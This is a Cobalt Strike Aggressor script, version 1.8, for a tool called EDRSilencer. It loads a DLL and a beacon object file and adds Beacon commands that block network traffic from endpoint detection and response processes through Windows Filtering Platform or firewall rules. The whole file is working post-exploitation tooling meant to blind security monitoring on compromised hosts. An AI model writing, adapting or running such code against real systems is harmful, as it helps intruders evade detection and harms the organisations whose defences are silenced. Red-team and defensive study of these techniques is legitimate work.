# EDRSilencer - Cobalt Strike Aggressor Script V1.8

# Global state to track the current mode
$edr_silencer_mode = "wfp"; # Default mode

# Cache for DLL and BOF bytes to avoid repeated disk I/O
$EDRSILENCER_DLL_BYTES = "";
$EDRSILENCER_BOF_BYTES = "";

sub load_resources {
    local('$dll_path $bof_path $handle');

    # Read the DLL file once on script load
    $dll_path = script_resource("EDRSilencer/EDRSilencer.dll");
    $handle = openf($dll_path);
    $EDRSILENCER_DLL_BYTES = readb($handle, -1);
    closef($handle);

    # Read the BOF file once on script load
    $bof_path = script_resource("EDRSilencer/bof_loader.x64.o");
    $handle = openf($bof_path);
    $EDRSILENCER_BOF_BYTES = readb($handle, -1);
    closef($handle);

    if (strlen($EDRSILENCER_DLL_BYTES) == 0 || strlen($EDRSILENCER_BOF_BYTES) == 0) {
        elog("[EDRSilencer] Error: Failed to load DLL or BOF resources.");
    }
}

# Load resources at script import time
load_resources();

sub execute_edrsilencer_bof {
    local('$bid $command $arg1 $bof_args');
    ($bid, $command, $arg1) = @_;

    # Pack the DLL bytes and command as arguments for the BOF
    if ($command eq "setmode") {
        $bof_args = bof_pack($bid, "bzi", $EDRSILENCER_DLL_BYTES, $command, $arg1);
    } else if ($arg1 is $null) {
        $bof_args = bof_pack($bid, "bz", $EDRSILENCER_DLL_BYTES, $command);
    } else {
        $bof_args = bof_pack($bid, "bzz", $EDRSILENCER_DLL_BYTES, $command, $arg1);
    }

    # Execute the BOF in the Beacon
    BeaconPrintf($bid, "[+] Executing EDRSilencer BOF in [" . $edr_silencer_mode . "] mode for command: " . $command);
    bof_execute($bid, $EDRSILENCER_BOF_BYTES, $bof_args);
}

command "edr_set_mode" {
    local('$bid $mode $use_firewall');
    ($bid, $mode) = @_;

    if ($mode eq "firewall") {
        $use_firewall = 1;
        $edr_silencer_mode = "firewall";
        binfo($bid, "EDRSilencer mode set to Firewall.");
    } else if ($mode eq "wfp") {
        $use_firewall = 0;
        $edr_silencer_mode = "wfp";
        binfo($bid, "EDRSilencer mode set to WFP (default).");
    } else {
        berror($bid, "Invalid mode. Use 'firewall' or 'wfp'.");
        return;
    }
    # The BOF needs to load the DLL first before it can call a function
    execute_edrsilencer_bof($1, "setmode", $use_firewall);
}

command "edr_block" {
    execute_edrsilencer_bof($1, "block", $null);
}

command "edr_add" {
    if ($2 is $null) {
        berror($1, "Usage: edr_add <full_process_path>");
        return;
    }
    execute_edrsilencer_bof($1, "add", $2);
}

command "edr_remove" {
    if ($2 is $null) {
        berror($1, "Usage: edr_remove <id_or_path>");
        return;
    }
    execute_edrsilencer_bof($1, "removeid", $2);
}

command "edr_removeall" {
    execute_edrsilencer_bof($1, "removeall", $null);
}

command "edr_initialize" {
    execute_edrsilencer_bof($1, "init", $null);
}

command "edr_list" {
    execute_edrsilencer_bof($1, "list", $null);
}

command "edr_help" {
    binfo($1, "--- EDRSilencer Help ---");
    binfo($1, "Current Mode: " . $edr_silencer_mode);
    binfo($1, "");
    binfo($1, "Usage: edr_command [arguments...]");
    binfo($1, "Commands:");
    binfo($1, "  edr_help                     - Shows this help menu.");
    binfo($1, "  edr_set_mode <wfp|firewall>  - Sets the operational mode (default: wfp).");
    binfo($1, "  edr_block                    - Blocks all detected EDR processes.");
    binfo($1, "  edr_add <path>               - Adds a block rule for a specific process path.");
    binfo($1, "  edr_list                     - (WFP Mode Only) Lists all WFP rules created by this tool.");
    binfo($1, "  edr_remove <id_or_path>      - Removes a specific rule.");
    binfo($1, "      In 'wfp' mode: provide the numeric Filter ID from 'edr_list'.");
    binfo($1, "      In 'firewall' mode: provide the full process path.");
    binfo($1, "  edr_removeall                - Removes all rules, sublayers, and providers created by this tool.");
}